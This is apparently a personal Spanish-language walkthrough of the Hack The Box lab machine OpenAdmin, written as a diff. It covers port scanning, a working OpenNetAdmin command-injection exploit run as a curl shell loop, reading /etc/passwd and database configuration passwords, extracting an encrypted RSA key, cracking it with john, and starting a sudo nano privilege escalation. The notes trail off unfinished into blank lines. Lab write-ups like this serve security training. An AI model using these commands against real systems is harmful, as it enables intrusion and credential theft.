@@ -1,0 +1,310 @@
+Conectar VPN hackthebox
+
+Carpeta del proyecto>
+
+Escritorio> OSCP> OpenAdmin
+
+Terminal#1
+{
+# nmap en terminal 
+nmap -sC -sV 10.10.10.171 -o nmap.txt # -sC lanza los scripts mas utilizados ; -sV las versiones ; -o guardar el resultado en un archivo.
+port 22 open ssh openssh 7.6p1
+port 80 open http apache httpd 2.4.29 (ubuntu)
+
+# En el navegador entrar a 10.10.10.171
+apache 
+
+# Usar dirbuster en terminal
+dirbuster 
+
+# OWASP Dirbuster ventana GUI
+
+Agregar url y lista medium de directorios 
+ # Descargar lista de repositorio github en busqueda de google
+    https://github.com/daviddias/node-dirbuster/tree/master/lists
+    https://raw.githubusercontent.com/daviddias/node-dirbuster/master/lists/directory-list-2.3-medium.txt
+     # Descargar la lista>
+       wget https://raw.githubusercontent.com/daviddias/node-dirbuster/master/lists/directory-list-2.3-medium.txt
+          Agregar lista a dirbuster y escanear
+            Resultado dos carpetas de interes> ona , music 
+# cargar directori ona por el navegador web
+http://10.10.10.171/ona
+# Nos carga la herramienta OpenNetAdmin que es un sistema opensource administrador de direcciones IP (IPAM)
+# BUscamos vulnerabilidades con searchsploit en el terminal
+searchslploit opennetadmin v18.1.1 
+Resultado>
+exploits 47691
+exploits 47772
+# Locate en terminal 
+locate <name_exploit>
+# Busqueda en Google
+OpenNetAdmin v18.1.1 exploit 
+Resultado>  
+https://www.exploit-db.com/exploits/47691
+https://www.exploit-db.com/exploits/47772
+# Usamos el exploit 47691
+ # Daremos permiso al archivo que crearemos script.sh
+ cd $HOME && touch script.sh && chmod +x script.sh
+ cd $HOME && echo '#!/bin/bash' > script.sh && echo '# -*- ENCODING: UTF-8 -*-' >> script.sh
+ cd $HOME 
+ #Modificamos el hash para que de un solo busque la IP del target
+ URL="10.10.10.171/ona"
+ # Copiamos el codigo bash del exploit en un archivo script.sh>
+URL="10.10.10.171/ona"
+while true;do
+ echo -n "$ "; read cmd
+ curl --silent -d "xajax=window_submit&xajaxr=1574117726710&xajaxargs[]=tooltips&xajaxargs[]=ip%3D%3E;echo \"BEGIN\";${cmd};echo \"END\"&xajaxargs[]=ping" "${URL}" | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
+done
+# en otra terminal ejecutamos el archivo script.sh en la ruta de HOME
+ ./script.sh 10.10.10.171/ona
+# Abrira una SHELL
+$ pwd
+$ls -a
+$whoami
+www-data
+# Verificamos si tenemos acceso a /etc/passwd
+ls -l /etc/passwd
+Resultado>
+-rw-r--r-- 1 root root 1660 Nov 22 18:01 /etc/passwd
+$ cat /etc/passwd
+Resultado> 
+jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
+joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
+
+# El usuario www-data no puede ejecutar cd para abandonar el directorio actual
+# Luego de validar en que ruta estamos y usuario , Usamos find / -type d -user para ver los directorios a los que tiene permiso de acceso
+$ find / -type d -user
+/opt/ona
+/var/www
+$ ls -l /opt/ona/www/config
+auth_ldap.config.php
+config.inc.php
+# Verificamos el archivo config.inc.php
+cat /opt/ona/www/local/config/database_settings.inc.php
+Resultado>
+
+'db_passwd --> 'ninj4W4rri0R!'
+
+#Probamos la contraseña en el usuario jimmy en otra terminal con conexion SSH>
+
+ssh jimmy@10.10.10.171
+password:
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-70-generic x86_64)
+
+# Exploramos en la terminal
+
+jimmy@openadmin:~$ ls
+jimmy@openadmin:~$ cd home
+jimmy@openadmin:~$ ls -la
+jimmy@openadmin:~$ cd /
+jimmy@openadmin:~$ ls
+jimmy@openadmin:~$ cd var
+jimmy@openadmin:~$ ls 
+jimmy@openadmin:~$ cd internal 
+jimmy@openadmin:~$ ls 
+jimmy@openadmin:~$ cat main.php
+Resultado>
+
+<?php session_start(); if (!isset ($_SESSION['username'])) { header("Location: /index.php"); }; 
+# Open Admin Trusted
+# OpenAdmin
+$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
+echo "<pre>output</pre>";
+?>
+<html>
+<h3>Don't forget your "ninja" password</h3>
+Click here to logout <a href="logout.php" tite = "Logout">Session
+</html>
+
+# Este archivo contiene un hash rsa para joana>
+# Usaremos el comando curl para transferir el hash 
+# Si ejecutamos como local nos manda un error 404 not found
+curl http://127.0.0.1/main.php
+# usaremos 127.0.0.1 en el puerto 80
+# usaremos 127.0.0.1 en el puerto que tiene acceso a la clave privada
+# Buscar el puerto de acceso>
+
+jimmy@openadmin:/var/www/internal$netstat -tulpn
+
+# Parametros de tulpn
+t: tcp
+u: udp
+l: listening ports
+p: process
+n: network 
+# Resultado> 
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.1:52846         0.0.0.0:*               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
+tcp6       0      0 :::80                   :::*                    LISTEN      -                   
+tcp6       0      0 :::22                   :::*                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:*    
+
+# Probamos los puertos>
+
+jimmy@openadmin:/var/www/internal$ curl http://127.0.0.1:3306/main.php
+jimmy@openadmin:/var/www/internal$ curl http://127.0.0.1:52846/main.php
+
+Resultado>
+
+Warning: Binary output can mess up your terminal. Use "--output -" to tell 
+Warning: curl to output it to your terminal anyway, or consider "--output 
+Warning: <FILE>" to save to a file.
+jimmy@openadmin:/var/www/internal$ curl http://127.0.0.1:52846/main.php
+<pre>-----BEGIN RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D
+ 
+kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
+ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
+ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
+6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
+ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
+y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
+9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
+piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
+/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
+40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
+fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
+9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
+X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
+S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
+FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
+Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
+RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
+uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
+1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
+XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
+yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
++4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
+qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
+z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
+K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
+-----END RSA PRIVATE KEY-----
+</pre><html>
+<h3>Don't forget your "ninja" password</h3>
+Click here to logout <a href="logout.php" tite = "Logout">Session
+</html>
+
+# En otra terminal del kali usar john para crackear usando rockyou.txt 
+python /usr/share/john/ssh2john.py joanna_rsa > joanna_rsa.hash
+/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt joanna_rsa.hash
+Resultado> bloodninjas      (joanna_rsa)
+
+# Después de probar esta contraseña, no es la contraseña de conexión ssh de Joanna,
+sino la contraseña de verificación de la clave privada cuando se usa ssh para conectarse a ssh
+# Después de conectarse a ssh de joanna, asegúrese de establecer los permisos de archivo de la clave privada en 700
+# En la terminal de kali que contiene joanna_rsa ejecutar >
+chmod 700 joanna_rsa
+ssh -i joanna_rsa joanna@10.10.10.171
+
+# una vez adentro de la maquina con el usuario joanna , buscar el user.txt
+joanna@openadmin:~$ ls -la
+joanna@openadmin:~$ sudo -l
+user.txt
+joanna@openadmin:~$ cat user.txt
+......1b5f # flag # 1
+
+# Buscar el otro flag de root>
+
+joanna@openadmin:~$ sudo /bin/nano /opt/priv 
+
+¿El Sudo confirma si realmente necesita ejecutar el archivo como root? Obviamente diga "sí"
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+$ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+ 
+
+
+
+
+
+
+}
